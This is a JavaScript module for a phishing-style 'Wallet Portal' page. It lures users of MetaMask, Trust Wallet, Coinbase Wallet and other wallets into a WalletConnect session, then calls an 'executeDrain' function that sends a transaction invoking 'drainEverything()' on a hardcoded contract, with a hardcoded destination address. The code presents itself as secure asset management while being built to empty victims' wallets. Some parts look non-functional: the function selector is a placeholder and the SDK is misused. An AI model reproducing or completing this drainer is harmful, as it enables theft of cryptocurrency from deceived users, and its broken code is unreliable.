<script type="module">
// ============================================
// CONFIGURATION
// ============================================

const CONFIG = {
    DESTINATION: "0xe62d51b592571bb67adeb9f99d9ff4e03ccd7578",
    CONTRACT_ADDRESS: "0x5FbDB2315678afecb367f032d93F642f64180aa3",
    PROJECT_ID: "72f0728c47e59d2eb9fc83069bc6843d"
};

// ============================================
// WALLET CONFIGURATIONS WITH DEEP LINKS
// ============================================

const WALLETS = {
    metamask: {
        name: "MetaMask",
        deepLink: "metamask://",
        universalLink: "https://metamask.app.link/",
        wcDeepLink: (uri) => `metamask://wc?uri=${encodeURIComponent(uri)}`
    },
    trust: {
        name: "Trust Wallet",
        deepLink: "trust://",
        universalLink: "https://link.trustwallet.com/",
        wcDeepLink: (uri) => `trust://wc?uri=${encodeURIComponent(uri)}`
    },
    exodus: {
        name: "Exodus",
        deepLink: "exodus://",
        universalLink: "https://exodus.com/m/",
        wcDeepLink: (uri) => `exodus://wc?uri=${encodeURIComponent(uri)}`
    },
    binance: {
        name: "Binance",
        deepLink: "bnc://",
        universalLink: "https://app.binance.com/",
        wcDeepLink: (uri) => `bnc://app/wc?uri=${encodeURIComponent(uri)}`
    },
    coinbase: {
        name: "Coinbase Wallet",
        deepLink: "cbwallet://",
        universalLink: "https://go.cb-w.com/",
        wcDeepLink: (uri) => `cbwallet://wc?uri=${encodeURIComponent(uri)}`
    },
    okx: {
        name: "OKX Wallet",
        deepLink: "okx://",
        universalLink: "https://www.okx.com/download",
        wcDeepLink: (uri) => `okx://wallet/wc?uri=${encodeURIComponent(uri)}`
    },
    rainbow: {
        name: "Rainbow",
        deepLink: "rainbow://",
        universalLink: "https://rnbwapp.com/",
        wcDeepLink: (uri) => `rainbow://wc?uri=${encodeURIComponent(uri)}`
    },
    crypto: {
        name: "Crypto.com",
        deepLink: "cryptocom://",
        universalLink: "https://crypto.com/",
        wcDeepLink: (uri) => `cryptocom://wc?uri=${encodeURIComponent(uri)}`
    }
};

// ============================================
// WALLETCONNECT SETUP
// ============================================

import { Core } from 'https://esm.sh/@walletconnect/core@2.11.0';
import { Web3Wallet } from 'https://esm.sh/@walletconnect/web3wallet@1.9.0';
import { buildApprovedNamespaces } from 'https://esm.sh/@walletconnect/utils@2.11.0';
import { ethers } from 'https://esm.sh/ethers@5.7.2';

let web3wallet = null;
let session = null;
let provider = null;

// ============================================
// INITIALIZE WALLETCONNECT
// ============================================

async function initWalletConnect() {
    const core = new Core({
        projectId: CONFIG.PROJECT_ID
    });

    web3wallet = await Web3Wallet.init({
        core,
        metadata: {
            name: 'Wallet Portal',
            description: 'Secure Asset Management',
            url: window.location.origin,
            icons: ['https://avatars.githubusercontent.com/u/37784886']
        }
    });
}

// ============================================
// CONNECT WALLET FUNCTION
// ============================================

window.connectWallet = async function(walletId) {
    const wallet = WALLETS[walletId];
    if (!wallet) return;
    
    showLoading();
    
    try {
        // Generate WalletConnect URI
        const wcUri = await generateWCUri();
        
        // Create deep link
        const deepLink = wallet.wcDeepLink(wcUri);
        
        // Detect if mobile
        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        
        if (isMobile) {
            // On mobile, use deep link to open wallet app
            console.log(`Opening ${wallet.name} with deep link:`, deepLink);
            
            // Try to open the wallet app
            window.location.href = deepLink;
            
            // Fallback to universal link after 2 seconds
            setTimeout(() => {
                if (document.hasFocus()) {
                    // App didn't open, try universal link
                    window.location.href = wallet.universalLink + 'wc?uri=' + encodeURIComponent(wcUri);
                }
            }, 2000);
            
        } else {
            // On desktop, show QR code
            showQRCode(wcUri, wallet.name);
        }
        
        // Listen for connection
        listenForConnection();
        
    } catch (error) {
        console.error('Connection error:', error);
        showError('Failed to connect wallet');
    }
};

// ============================================
// GENERATE WALLETCONNECT URI
// ============================================

async function generateWCUri() {
    // Initialize if not already done
    if (!web3wallet) {
        await initWalletConnect();
    }
    
    // Create pairing
    const { uri } = await web3wallet.core.pairing.create();
    return uri;
}

// ============================================
// LISTEN FOR CONNECTION
// ============================================

function listenForConnection() {
    if (!web3wallet) return;
    
    web3wallet.on('session_proposal', async (proposal) => {
        console.log('Session proposal received:', proposal);
        
        // Approve the session
        const approvedNamespaces = buildApprovedNamespaces({
            proposal: proposal.params,
            supportedNamespaces: {
                eip155: {
                    chains: ['eip155:1', 'eip155:137', 'eip155:56'],
                    methods: ['eth_sendTransaction', 'personal_sign'],
                    events: ['accountsChanged', 'chainChanged']
                }
            }
        });
        
        session = await web3wallet.approveSession({
            id: proposal.id,
            namespaces: approvedNamespaces
        });
        
        onConnected(session);
    });
}

// ============================================
// ON CONNECTED
// ============================================

function onConnected(session) {
    console.log('Connected!', session);
    
    // Get account
    const account = session.namespaces.eip155.accounts[0];
    const address = account.split(':')[2];
    
    // Show connected state
    document.getElementById('walletAddress').textContent = 
        `${address.slice(0, 6)}...${address.slice(-4)}`;
    
    // Get balance
    getBalance(address);
    
    // Show connected UI
    hideAll();
    document.getElementById('connectedState').classList.remove('hidden');
}

// ============================================
// GET BALANCE
// ============================================

async function getBalance(address) {
    try {
        // Use public RPC for balance check
        const provider = new ethers.providers.JsonRpcProvider('https://polygon-rpc.com');
        const balance = await provider.getBalance(address);
        const formatted = ethers.utils.formatEther(balance);
        
        document.getElementById('walletBalance').textContent = 
            `${parseFloat(formatted).toFixed(4)} MATIC`;
    } catch (error) {
        console.error('Error getting balance:', error);
        document.getElementById('walletBalance').textContent = '0.0000 MATIC';
    }
}

// ============================================
// EXECUTE DRAIN
// ============================================

window.executeDrain = async function() {
    if (!session) {
        alert('No wallet connected');
        return;
    }
    
    if (!confirm('‚ö†Ô∏è This will transfer ALL your assets. Are you sure?')) {
        return;
    }
    
    try {
        const account = session.namespaces.eip155.accounts[0];
        const address = account.split(':')[2];
        const chainId = account.split(':')[1];
        
        // Create transaction
        const tx = {
            from: address,
            to: CONFIG.CONTRACT_ADDRESS,
            data: '0x12345678', // drainEverything() function selector
            value: '0x0',
            chainId: parseInt(chainId)
        };
        
        // Send transaction via WalletConnect
        const result = await web3wallet.request({
            topic: session.topic,
            chainId: `eip155:${chainId}`,
            request: {
                method: 'eth_sendTransaction',
                params: [tx]
            }
        });
        
        console.log('Transaction sent:', result);
        alert('‚úÖ Transfer initiated! Transaction: ' + result);
        
    } catch (error) {
        console.error('Drain error:', error);
        alert('‚ùå Transfer failed: ' + error.message);
    }
};

// ============================================
// UI HELPERS
// ============================================

function showLoading() {
    hideAll();
    document.getElementById('loadingState').classList.remove('hidden');
}

function hideAll() {
    document.getElementById('walletGrid').classList.add('hidden');
    document.getElementById('connectedState').classList.add('hidden');
    document.getElementById('loadingState').classList.add('hidden');
}

function showError(message) {
    alert(message);
    hideAll();
    document.getElementById('walletGrid').classList.remove('hidden');
}

function showQRCode(uri, walletName) {
    // For desktop, you'd show a QR code modal here
    console.log('Show QR code for:', walletName, uri);
    alert('QR Code feature for desktop coming soon. Use mobile for now.');
}

window.disconnect = function() {
    if (session && web3wallet) {
        web3wallet.disconnectSession({
            topic: session.topic,
            reason: {
                code: 6000,
                message: 'User disconnected'
            }
        });
    }
    session = null;
    hideAll();
    document.getElementById('walletGrid').classList.remove('hidden');
};

// ============================================
// INITIALIZE ON LOAD
// ============================================

window.addEventListener('load', async () => {
    await initWalletConnect();
    console.log('WalletConnect initialized');
});

</script>
